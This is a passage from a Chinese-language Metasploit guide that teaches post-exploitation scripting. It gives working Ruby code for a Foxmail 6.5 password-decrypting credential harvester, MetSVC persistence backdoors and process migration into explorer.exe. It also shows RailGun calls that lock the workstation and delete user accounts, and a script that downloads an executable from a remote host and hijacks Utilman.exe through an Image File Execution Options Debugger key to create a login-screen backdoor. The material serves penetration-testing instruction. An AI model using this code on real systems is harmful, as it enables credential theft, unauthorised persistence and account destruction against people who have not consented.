在前面的代码中，我们将路径设置为`key1`，将值设置为`NoViewOnDrives`，将驱动器`D`的十进制值设置为 16，将注册表的类型设置为`REG_DWORD`，并将视图设置为`REGISTRY_VIEW_NATIVE`，即 0。

对于 32 位注册表访问，我们需要将 1 作为视图参数提供，对于 64 位，我们需要提供 2。但是，这可以使用`REGISTRY_VIEW_32_BIT`和`REGISTRY_VIEW_64_BIT`来完成。

你可能想知道我们是如何知道对于驱动器`E`，我们需要将位掩码的值设置为`16`？让我们看看在下一节中如何计算位掩码。

要计算特定驱动器的位掩码，我们有公式`2^([驱动器字符序号]-1)`。假设我们需要禁用驱动器`E`；我们知道字符 E 是字母表中的第五个字符。因此，我们可以计算禁用驱动器`E`的确切位掩码值，如下所示：

*2^ (5-1) = 2⁴= 16*

位掩码值为`16`用于禁用`E`驱动器。然而，在前面的模块中，我们在`drive_string`方法中使用`case`开关硬编码了一些值。让我们看看我们是如何做到的：

```
def drive_string(drive) 
case drive 
when "A" 
return 1 

when "B" 
return 2 

when "C" 
return 4 

when "D" 
return 8 

when "E" 
return 16 
end 
end 
end 
```

我们可以看到，前面的方法接受一个驱动器字母作为参数，并将其对应的数字返回给调用函数。让我们看看目标系统上有多少个驱动器：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/cdf52ba4-44f7-4138-a791-b6d112b9abf4.png)

我们可以看到我们有两个驱动器，驱动器`C`和驱动器`E`。让我们也检查一下我们将在其中写入新键的注册表条目：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/294642e8-bbf3-4d98-8916-8bab60661226.png)

我们可以看到我们还没有一个 explorer 键。让我们运行模块，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/fed15fd8-ff77-444e-9994-4e1d974f0539.png)

我们可以看到该键不存在，并且根据我们模块的执行，它应该已经在注册表中写入了键。让我们再次检查注册表：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/27fa3f01-dc25-4b67-ab0d-11fe554fd673.png)

我们可以看到我们有现有的键。注销并重新登录系统后，驱动器`E`应该已经消失了。让我们检查一下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/b66f51cc-8957-4a98-989a-4d6e7977f66d.png)

没有`E`驱动器的迹象。因此，我们成功地从用户视图中禁用了`E`驱动器，并限制了对其的访问。

根据我们的需求，我们可以创建尽可能多的后渗透模块。我建议您花一些额外的时间来了解 Metasploit 的库。

确保您对上述脚本具有`SYSTEM`级别访问权限，因为`SYSTEM`特权不会在当前用户下创建注册表，而是会在本地计算机上创建注册表。除此之外，我们使用了`HKLM`而不是写`HKEY_LOCAL_MACHINE`，因为内置的规范化将自动创建键的完整形式。我建议您检查`registry.rb`文件以查看各种可用的方法。

如果您没有系统权限，请尝试使用`exploit/windows/local/bypassuac`模块并切换到提升的 shell，然后尝试上述模块。

# 编写凭证收集后渗透模块

在这个示例模块中，我们将攻击 Foxmail 6.5。我们将尝试解密凭据并将其存储在数据库中。让我们看看代码：

```
class MetasploitModule < Msf::Post 
  include Msf::Post::Windows::Registry 
  include Msf::Post::File 
  include Msf::Auxiliary::Report 
  include Msf::Post::Windows::UserProfiles 

  def initialize(info={}) 
    super(update_info(info, 
      'Name'          => 'FoxMail 6.5 Credential Harvester', 
      'Description'   => %q{ 
This Module Finds and Decrypts Stored Foxmail 6.5 Credentials 
      }, 
      'License'       => MSF_LICENSE, 
      'Author'        => ['Nipun Jaswal'], 
      'Platform'      => [ 'win' ], 
      'SessionTypes'  => [ 'meterpreter' ] 
    )) 
  end 
```

就像我们在前面的模块中看到的那样；我们首先包括所有必需的库，并提供有关模块的基本信息。

我们已经看到了`Msf::Post::Windows::Registry`和`Msf::Auxiliary::Report`的用法。让我们看看我们在此模块中包含的新库的详细信息，如下所示：

| **包含语句** | **路径** | **用法** |
| --- | --- | --- |
| `Msf::Post::Windows::UserProfiles` | `lib/msf/core/post/windows/user_profiles.rb` | 此库将提供 Windows 系统上的所有配置文件，包括查找重要目录、路径等。 |
| `Msf::Post::File` | `lib/msf/core/post/file.rb` | 此库将提供函数，将帮助文件操作，如读取文件、检查目录、列出目录、写入文件等。 |

在了解模块的下一部分之前，让我们看看我们需要执行哪些操作来收集凭据：

1.  我们将搜索用户配置文件，并找到当前用户的`LocalAppData`目录的确切路径。

1.  我们将使用先前找到的路径，并将其与`\VirtualStore\Program Files (x86)\Tencent\Foxmail\mail`连接起来，以建立到`mail`目录的完整路径。

1.  我们将从 `mail` 目录中列出所有目录，并将它们存储在一个数组中。但是，`mail` 目录中的目录名称将使用各种邮件提供程序的用户名命名约定。例如，`nipunjaswal@rocketmail.com` 将是 `mail` 目录中存在的目录之一。

1.  接下来，我们将在 `mail` 目录下找到帐户目录中的 `Account.stg` 文件。

1.  我们将读取 `Account.stg` 文件，并找到名为 `POP3Password` 的常量的哈希值。

1.  我们将哈希值传递给我们的解密方法，该方法将找到明文密码。

1.  我们将值存储在数据库中。

非常简单！让我们分析代码：

```
def run 
  profile = grab_user_profiles() 
  counter = 0 
  data_entry = "" 
  profile.each do |user| 
  if user['LocalAppData'] 
  full_path = user['LocalAppData'] 
  full_path = full_path+"\VirtualStore\Program Files (x86)\Tencent\Foxmail\mail" 
  if directory?(full_path) 
  print_good("Fox Mail Installed, Enumerating Mail Accounts") 
  session.fs.dir.foreach(full_path) do |dir_list| 
  if dir_list =~ /@/ 
  counter=counter+1 
  full_path_mail = full_path+ "\" + dir_list + "\" + "Account.stg" 
  if file?(full_path_mail) 
  print_good("Reading Mail Account #{counter}") 
  file_content = read_file(full_path_mail).split("n") 
```

在开始理解前面的代码之前，让我们看一下其中使用的重要函数，以便更好地了解其用法：

| **函数** | **库文件** | **用法** |
| --- | --- | --- |
| `grab_user_profiles()` | `lib/msf/core/post/windows/user_profiles.rb` | 获取 Windows 平台上重要目录的所有路径 |
| `directory?` | `lib/msf/core/post/file.rb` | 检查目录是否存在 |
| `file?` | `lib/msf/core/post/file.rb` | 检查文件是否存在 |
| `read_file` | `lib/msf/core/post/file.rb` | 读取文件的内容 |
| `store_loot` | `/lib/msf/core/auxiliary/report.rb` | 将收集到的信息存储到文件和数据库中 |

我们可以看到在前面的代码中，我们使用 `grab_user_profiles()` 获取了配置文件，并尝试找到 `LocalAppData` 目录。一旦找到，我们将其存储在一个名为 `full_path` 的变量中。

接下来，我们将路径连接到列出所有帐户的 `mail` 文件夹。我们使用 `directory?` 检查路径是否存在，并在成功时使用正则表达式匹配将包含 `@` 的目录名称复制到 `dir_list` 中。接下来，我们创建另一个名为 `full_path_mail` 的变量，并存储每封电子邮件的 `Account.stg` 文件的确切路径。我们确保使用 `file?` 来检查 `Account.stg` 文件是否存在。成功后，我们读取文件并在换行符处拆分所有内容。我们将拆分的内容存储到 `file_content` 列表中。让我们看代码的下一部分：

```
  file_content.each do |hash| 
  if hash =~ /POP3Password/ 
  hash_data = hash.split("=") 
  hash_value = hash_data[1] 
  if hash_value.nil? 
  print_error("No Saved Password") 
  else 
  print_good("Decrypting Password for mail account: #{dir_list}")  
  decrypted_pass = decrypt(hash_value,dir_list) 
  data_entry << "Username:" +dir_list + "t" + "Password:" + decrypted_pass+"n" 
  end 
  end 
  end 
  end 
  end 
  end 
  end 
  end 
  end 
  store_loot("Foxmail Accounts","text/plain",session,data_entry,"Fox.txt","Fox Mail Accounts") 
  end 
```

对于 `file_content` 中的每个条目，我们运行了一个检查，以查找常量 `POP3Password`。一旦找到，我们将常量在 `=` 处拆分，并将常量的值存储在一个名为 `hash_value` 的变量中。

接下来，我们直接将 `hash_value` 和 `dir_list`（帐户名）传递给 `decrypt` 函数。成功解密后，明文密码将存储在 `decrypted_pass` 变量中。我们创建另一个名为 `data_entry` 的变量，并将所有凭据附加到其中。我们这样做是因为我们不知道目标上可能配置了多少电子邮件帐户。因此，对于每个结果，凭据都会附加到 `data_entry`。所有操作完成后，我们使用 `store_loot` 方法将 `data_entry` 变量存储在数据库中。我们向 `store_loot` 方法提供了六个参数，分别为收集、内容类型、会话、`data_entry`、文件名和收集的描述。

让我们来了解解密函数，如下所示：

```
def decrypt(hash_real,dir_list) 
  decoded = "" 
  magic = Array[126, 100, 114, 97, 71, 111, 110, 126] 
  fc0 = 90 
  size = (hash_real.length)/2 - 1 
  index = 0 
  b = Array.new(size) 
  for i in 0 .. size do 
  b[i] = (hash_real[index,2]).hex  
  index = index+2 
  end 
  b[0] = b[0] ^ fc0 
  double_magic = magic+magic 
  d = Array.new(b.length-1) 
  for i in 1 .. b.length-1 do 
  d[i-1] = b[i] ^ double_magic[i-1] 
  end 
  e = Array.new(d.length) 
  for i in 0 .. d.length-1 
  if (d[i] - b[i] < 0) 
  e[i] = d[i] + 255 - b[i] 
  else 
  e[i] = d[i] - b[i] 
  end 
  decoded << e[i].chr 
  end 
  print_good("Found Username #{dir_list} with Password: #{decoded}") 
  return decoded 
  end 
  end 
```

在前面的方法中，我们收到了两个参数，即哈希密码和用户名。`magic` 变量是解密密钥，存储在一个包含 `~draGon~` 字符串的十进制值的数组中，依次存储。我们将整数 `90` 存储为 `fc0`，稍后我们将详细讨论。

接下来，我们通过将哈希除以 2 并减去 1 来找到哈希的大小。这将是我们新数组 `b` 的大小。

在下一步中，我们将哈希拆分为字节（每两个字符一个），并将其存储到数组 `b` 中。我们对数组 `b` 的第一个字节执行 `XOR`，将其与 `fc0` 执行 `XOR`，从而通过对其执行 `XOR` 操作来更新 `b[0]` 的值为 `90`。这对于 Foxmail 6.5 是固定的。

现在，我们将数组`magic`复制两次到一个新数组`double_magic`中。我们还声明`double_magic`的大小比数组`b`少一个。我们对数组`b`和`double_magic`数组的所有元素执行`XOR`操作，除了数组`b`的第一个元素，我们已经对其执行了 XOR 操作。

我们将 XOR 操作的结果存储在数组`d`中。在下一条指令中，我们将完整的数组`d`从数组`b`中减去。但是，如果特定减法操作的值小于 0，我们将向数组`d`的元素添加 255。

在下一步中，我们只需将结果数组`e`中特定元素的 ASCII 值附加到`decoded`变量中，并将其返回给调用语句。

让我们看看当我们运行这个模块时会发生什么：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/ab5556c2-f187-49c8-8b79-7385b72ebc5c.png)

很明显，我们轻松解密了存储在 Foxmail 6.5 中的凭据。

# 突破 Meterpreter 脚本

Meterpreter shell 是攻击者希望在目标上拥有的最理想的访问类型。Meterpreter 为攻击者提供了广泛的工具集，可以在受损系统上执行各种任务。Meterpreter 有许多内置脚本，这使得攻击者更容易攻击系统。这些脚本在受损系统上执行繁琐和直接的任务。在本节中，我们将看看这些脚本，它们由什么组成，以及我们如何在 Meterpreter 中利用它们。

基本的 Meterpreter 命令速查表可在以下网址找到：[`www.scadahackr.com/library/Documents/Cheat_Sheets/Hacking%20-%20Meterpreter%20Cheat%20%20Sheet.pdf`](http://www.scadahackr.com/library/Documents/Cheat_Sheets/Hacking%20-%20Meterpreter%20Cheat%20%20Sheet.pdf)。

# Meterpreter 脚本的基本知识

就我们所见，我们在需要在系统上执行一些额外任务时使用了 Meterpreter。然而，现在我们将看一些可能在渗透测试中出现的问题情况，在这些情况下，Meterpreter 中已经存在的脚本似乎对我们没有帮助。在这种情况下，我们很可能希望向 Meterpreter 添加我们自定义的功能，并执行所需的任务。然而，在我们继续向 Meterpreter 添加自定义脚本之前，让我们先执行一些 Meterpreter 的高级功能，并了解其功能。

# 建立持久访问

一旦我们访问了目标机器，我们可以像在上一章中看到的那样转移到内部网络，但是保留辛苦获得的访问权限也是必要的。但是，对于经过批准的渗透测试，这应该只在测试期间是强制性的，并且应该在项目的范围内。Meterpreter 允许我们使用两种不同的方法在目标上安装后门：**MetSVC**和**Persistence**。

我们将在接下来的章节中看到一些高级的持久性技术。因此，在这里我们将讨论 MetSVC 方法。MetSVC 服务被安装在受损系统中作为一个服务。此外，它永久地为攻击者打开一个端口，以便他或她随时连接。

在目标上安装 MetSVC 很容易。让我们看看我们如何做到这一点：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/dbc90c86-3243-4b22-a01b-0516d64dc105.png)

我们可以看到，MetSVC 服务在端口`31337`创建了一个服务，并且还上传了恶意文件。

稍后，每当需要访问此服务时，我们需要使用`metsvc_bind_tcp`有效载荷和一个利用处理程序脚本，这将允许我们再次连接到服务，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/ccffdeee-c153-4038-9320-6bb14589c054.png)

MetSVC 的效果甚至在目标机器重新启动后仍然存在。当我们需要对目标系统进行永久访问时，MetSVC 非常方便，因为它节省了重新利用目标所需的时间。

# API 调用和混合

我们刚刚看到了如何使用 Meterpreter 执行高级任务。这确实使渗透测试人员的生活变得更加轻松。

现在，让我们深入了解 Meterpreter 的工作原理，并揭示 Meterpreter 模块和脚本的基本构建过程。有时，我们可能会用尽 Meterpreter 的功能，并希望自定义功能来执行所有所需的任务。在这种情况下，我们需要构建自己的自定义 Meterpreter 模块，以实现或自动化在利用时所需的各种任务。

让我们首先了解 Meterpreter 脚本的基础知识。使用 Meterpreter 进行编码的基础是**应用程序编程接口**（**API**）调用和混入。这些是使用特定的基于 Windows 的**动态链接库**（**DLL**）执行特定任务所需的，以及使用各种内置的基于 Ruby 的模块执行一些常见任务所需的。

混入是基于 Ruby 编程的类，其中包含来自各种其他类的方法。当我们在目标系统上执行各种任务时，混入非常有帮助。除此之外，混入并不完全属于 IRB，但它们可以帮助轻松编写特定和高级的 Meterpreter 脚本。

有关混入的更多信息，请参阅：[`www.offensive-security.com/metasploit-unleashed/Mixins_and_Plugins`](http://www.offensive-security.com/metasploit-unleashed/Mixins_and_Plugins)。

我建议大家查看`/lib/rex/post/meterpreter`和`/lib/msf/scripts/meterpreter`目录，以查看 Meterpreter 使用的各种库。

API 调用是用于从 Windows DLL 文件中调用特定函数的 Windows 特定调用。我们将在*使用 RailGun*部分很快学习有关 API 调用的知识。

# 制作自定义 Meterpreter 脚本

让我们来编写一个简单的示例 Meterpreter 脚本，它将检查我们是否是管理员用户，然后找到资源管理器进程并自动迁移到其中。

在查看代码之前，让我们看看我们将使用的所有基本方法：

| **函数** | **库文件** | **用法** |
| --- | --- | --- |
| `is_admin` | `/lib/msf/core/post/windows/priv.rb` | 检查会话是否具有管理员权限。 |
| `is_in_admin_group` | `/lib/msf/core/post/windows/priv.rb` | 检查用户是否属于管理员组。 |
| `session.sys.process.get_processes()` | `/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb` | 列出目标上所有正在运行的进程。 |
| `session.core.migrate()` | `/lib/rex/post/meterpreter/client_core.rb` | 将访问从现有进程迁移到参数中指定的 PID。 |
| `is_uac_enabled?` | `/lib/msf/core/post/windows/priv.rb` | 检查 UAC 是否已启用。 |
| `get_uac_level` | `/lib/msf/core/post/windows/priv.rb` | 获取 UAC 级别：0,2,5 等。0：已禁用，2：全部，5：默认。 |

让我们看看以下代码：

```
#Admin Check 
print_status("Checking If the Current User is Admin") 
admin_check = is_admin? 
if(admin_check) 
print_good("Current User Is Admin") 
else 
print_error("Current User is Not Admin") 
end 
```

我们只是检查前面的代码中当前用户是否是管理员。函数`is_admin`返回一个布尔值，基于此我们打印结果：

```
#User Group Check 
user_check = is_in_admin_group? 
if(user_check) 
print_good("Current User is in the Admin Group") 
else 
print_error("Current User is Not in the Admin Group") 
end 
```

在先前的代码中，我们检查用户是否属于管理员组。在逻辑上，前面的代码片段与先前的代码非常相似：

```

#Process Id Of the Explorer.exe Process 
current_pid = session.sys.process.getpid 
print_status("Current PID is #{current_pid}") 
session.sys.process.get_processes().each do |x| 
if x['name'].downcase == "explorer.exe" 
print_good("Explorer.exe Process is Running with PID #{x['pid']}") 
explorer_ppid = x['pid'].to_i 
# Migration to Explorer.exe Process 
session.core.migrate(explorer_ppid) 
current_pid = session.sys.process.getpid 
print_status("Current PID is #{current_pid}") 
end 
end  
```

这里的代码段非常有趣。我们首先使用`session.sys.process.getpid`找到当前进程 ID，然后使用`session.sys.process.get_processes()`上的循环遍历目标系统上的所有进程。如果找到任何名称为`explorer.exe`的进程，我们打印出一条消息并将其 ID 存储到`explorer_ppid`变量中。使用`session.core.migrate()`方法，我们将存储的进程 ID（`explorer.exe`）传递到`explorer.exe`进程中进行迁移。最后，我们只是再次打印当前进程 ID，以确保我们是否成功迁移：

```
# Finding the Current User 
print_status("Getting the Current User ID") 
currentuid = session.sys.config.getuid 
print_good("Current Process ID is #{currentuid}") 
```

在先前的代码中，我们只是使用`sessions.sys.config.getuid`方法找到当前用户的标识符：

```
#Checking if UAC is Enabled 
uac_check = is_uac_enabled? 
if(uac_check) 
print_error("UAC is Enabled") 
uac_level = get_uac_level 
if(uac_level = 5) 
print_status("UAC level is #{uac_level.to_s} which is Default") 
elsif (uac_level = 2) 
print_status("UAC level is #{uac_level.to_s} which is Always Notify") 
else 
print_error("Some Error Occured") 
end 
else 
print_good("UAC is Disabled") 
end 
```

前面的代码检查了目标系统上是否启用了 UAC。如果启用了 UAC，我们进一步深入，使用`get_uac_level`方法找到 UAC 的级别，并通过其响应值打印状态。

让我们将这段代码保存在`/scripts/meterpreter/gather.rb`目录中，并从 Meterpreter 中启动此脚本。这将给您一个类似于以下屏幕截图的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/c19600f6-ff72-4397-9699-4228a20765f6.png)

我们可以看到，创建 Meterpreter 脚本并执行各种任务和任务自动化是多么容易。我建议您检查模块中包含的所有文件和路径，以便广泛探索 Meterpreter。

根据 Metasploit 的官方维基，您不应再编写 Meterpreter 脚本，而应编写后渗透模块。

# 使用 RailGun

电磁炮听起来像是一种比光还快的枪，射出子弹；然而，事实并非如此。RailGun 允许您调用 Windows API，而无需编译自己的 DLL。

它支持许多 Windows DLL 文件，并为我们在受害者机器上执行系统级任务提供了便利。让我们看看如何使用 RailGun 执行各种任务，并进行一些高级的后渗透。

# 交互式 Ruby shell 基础知识

RailGun 需要将`irb` shell 加载到 Meterpreter 中。让我们看看如何从 Meterpreter 跳转到`irb` shell：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/d30b74c7-6dae-406e-8b49-bd33212e7df5.jpg)

我们可以在前面的屏幕截图中看到，仅仅从 Meterpreter 中键入`irb`就可以让我们进入 Ruby 交互式 shell。我们可以在这里使用 Ruby shell 执行各种任务。

# 了解 RailGun 及其脚本

RailGun 给了我们巨大的力量，可以执行 Metasploit 有时无法执行的任务。使用 RailGun，我们可以向被侵入系统的任何 DLL 文件发出异常调用。

现在，让我们看看如何使用 RailGun 进行基本 API 调用，并了解其工作原理：

```
client.railgun.DLLname.function(parameters) 
```

这是 RailGun 中 API 调用的基本结构。`client.railgun`关键字定义了客户端对 RailGun 功能的需求。`DLLname`关键字指定了我们将要调用的 DLL 文件的名称。语法中的`function (parameters)`关键字指定了要使用来自 DLL 文件的所需参数来激发的实际 API 函数。

让我们看一个例子：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/43415550-6936-42db-ad36-87e3556a5b50.png)

此 API 调用的结果如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/368aa390-7c19-4ffd-9d98-917a0ada5957.png)

在这里，调用了来自`user32.dll` DLL 文件的`LockWorkStation()`函数，导致了受损系统的锁定。

接下来，让我们看一个带参数的 API 调用：

```
client.railgun.netapi32.NetUserDel(arg1,agr2) 
```

当上述命令运行时，它会从客户端的机器中删除特定用户。目前，我们有以下用户：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/2b3f1cfb-ab15-4472-be69-915aedfebbe0.png)

让我们尝试删除`Nipun`用户名：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/e76bfca2-5f19-4491-b614-c3fee8538e42.png)

让我们检查用户是否已成功删除：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/295610ba-e3f2-46e2-ac1c-cb3d70530ecb.png)

用户似乎已经去钓鱼了。RailGun 调用已成功删除了用户`Nipun`。`nil`值定义了用户在本地机器上。但是，我们也可以使用名称参数来针对远程系统。

# 操纵 Windows API 调用

DLL 文件负责在基于 Windows 的系统上执行大部分任务。因此，了解哪个 DLL 文件包含哪些方法是至关重要的。这与 Metasploit 的库文件非常相似，它们中有各种方法。要研究 Windows API 调用，我们在[`source.winehq.org/WineAPI/`](http://source.winehq.org/WineAPI/)和[`msdn.microsoft.com/en-us/library/windows/desktop/ff818516(v=vs.85).aspx`](http://msdn.microsoft.com/en-us/library/windows/desktop/ff818516(v=vs.85).aspx)上有很好的资源。我建议在继续创建 RailGun 脚本之前，您探索各种 API 调用。

请参考以下路径，了解有关 RailGun 支持的 DLL 文件的更多信息：`/usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/railgun/def`。

# 制作复杂的 RailGun 脚本

更进一步，让我们深入研究使用 RailGun 编写 Meterpreter 扩展的脚本。首先，让我们创建一个脚本，该脚本将向 Metasploit 上下文中添加一个自定义命名的 DLL 文件：

```
if client.railgun.get_dll('urlmon') == nil 
print_status("Adding Function") 
end 
client.railgun.add_dll('urlmon','C:\WINDOWS\system32\urlmon.dll') 
client.railgun.add_function('urlmon','URLDownloadToFileA','DWORD',[ 
["DWORD","pcaller","in"], 
["PCHAR","szURL","in"], 
["PCHAR","szFileName","in"], 
["DWORD","Reserved","in"], 
["DWORD","lpfnCB","in"], 
]) 
```

将代码保存在名为`urlmon.rb`的文件中，放在`/scripts/meterpreter`目录下。

上述脚本向`C:\WINDOWS\system32\urlmon.dll`文件添加了一个引用路径，其中包含所有浏览所需的函数，以及下载特定文件等功能。我们将此引用路径保存为`urlmon`的名称。接下来，我们使用 DLL 文件的名称作为第一个参数，我们将要挂钩的函数的名称作为第二个参数，即`URLDownloadToFileA`，然后是所需的参数，向 DLL 文件添加一个函数。代码的第一行检查 DLL 函数是否已经存在于 DLL 文件中。如果已经存在，脚本将跳过再次添加该函数。如果调用应用程序不是 ActiveX 组件，则将`pcaller`参数设置为`NULL`；如果是，则设置为 COM 对象。`szURL`参数指定要下载的 URL。`szFileName`参数指定从 URL 下载的对象的文件名。`Reserved`始终设置为`NULL`，`lpfnCB`处理下载的状态。但是，如果不需要状态，则应将此值设置为`NULL`。

现在让我们创建另一个脚本，该脚本将利用此功能。我们将创建一个后渗透脚本，该脚本将下载一个免费文件管理器，并将修改 Windows OS 上实用程序管理器的条目。因此，每当调用实用程序管理器时，我们的免费程序将代替运行。

我们在同一目录下创建另一个脚本，并将其命名为`railgun_demo.rb`，如下所示：

```
client.railgun.urlmon.URLDownloadToFileA(0,"http://192.168.1.10 /A43.exe","C:\Windows\System32\a43.exe",0,0) 
key="HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Utilman.exe" 
syskey=registry_createkey(key) 
registry_setvaldata(key,'Debugger','a43.exe','REG_SZ') 
```

如前所述，脚本的第一行将调用自定义添加的 DLL 函数`URLDownloadToFile`，并提供所需的参数。

接下来，我们在父键`HKLMSOFTWAREMicrosoftWindows NTCurrentVersionImage File Execution Options`下创建一个名为`Utilman.exe`的键。

我们在`utilman.exe`键下创建一个名为`Debugger`的`REG_SZ`类型的注册表值。最后，我们将值`a43.exe`分配给`Debugger`。

让我们从 Meterpreter 运行此脚本，看看情况如何：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/811f4a49-d537-441c-b9f0-7b9e0d639357.png)

一旦我们运行`railgun_demo`脚本，文件管理器将使用`urlmon.dll`文件下载，并放置在`system32`目录中。接下来，创建注册表键，以替换实用程序管理器的默认行为，运行`a43.exe`文件。因此，每当从登录屏幕按下辅助功能按钮时，`a43`文件管理器将显示并作为目标系统上的登录屏幕后门。

让我们看看从登录屏幕按下辅助功能按钮时会发生什么，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/831b6cc5-2b48-459f-88df-336d3bbc4184.png)

我们可以看到它打开了一个`a43`文件管理器，而不是实用程序管理器。现在我们可以执行各种功能，包括修改注册表、与 CMD 交互等，而无需登录到目标。您可以看到 RailGun 的强大之处，它简化了创建您想要的任何 DLL 文件的路径的过程，并且还允许您向其中添加自定义功能。

有关此 DLL 函数的更多信息，请访问：[`docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms775123(v=vs.85)`](https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms775123(v=vs.85))。

# 摘要和练习

在本章中，我们涵盖了 Metasploit 的编码工作。我们还研究了模块、后渗透脚本、Meterpreter、RailGun 和 Ruby 编程。在本章中，我们看到了如何向 Metasploit 框架添加我们自定义的功能，并使已经强大的框架变得更加强大。我们首先熟悉了 Ruby 的基础知识。我们学习了编写辅助模块、后渗透脚本和 Meterpreter 扩展。我们看到了如何利用 RailGun 添加自定义功能，比如向目标的 DLL 文件添加 DLL 文件和自定义功能。

为了进一步学习，您可以尝试以下练习：

+   为 FTP 创建一个身份验证暴力破解模块

+   为 Windows、Linux 和 macOS 各开发至少三个后渗透模块，这些模块尚不是 Metasploit 的一部分

+   在 RailGun 上工作，并为至少三个不同功能的 Windows DLL 开发自定义模块

在下一章中，我们将在 Metasploit 中的开发和利用模块的背景下进行研究。这是我们将开始编写自定义利用、对各种参数进行模糊测试以进行利用、利用软件，并为软件和网络编写高级利用的地方。
